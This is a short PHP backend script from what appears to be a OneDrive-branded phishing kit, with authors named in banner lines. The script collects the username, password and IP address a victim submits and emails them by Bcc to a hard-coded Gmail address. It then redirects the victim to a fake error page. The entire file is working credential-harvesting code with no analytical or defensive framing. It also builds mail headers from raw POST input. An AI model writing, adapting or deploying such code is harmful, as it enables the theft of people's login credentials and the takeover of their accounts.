<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------OneDrive-BY-Kamali-----------------------\n";
$message .= "Username       : ".$_POST['uname']."\n";
$message .= "Password      : ".$_POST['psw']."\n";

$message .= "------------------------IP------------------------------\n";
$message .= "IP                : $ip\n";$IP=$_POST['IP'];
$message .= "--------------OneDrive-BY-tansholee----------------------\n";
$send = "";
$bcc="johnmacjj77@gmail.com" ;
$subject = "OneDerive".$_POST['email'];
$headers .= $_POST['pass']."\n";



mail($send, $subject, $message, "Bcc: $bcc");


header("Location: err.htm");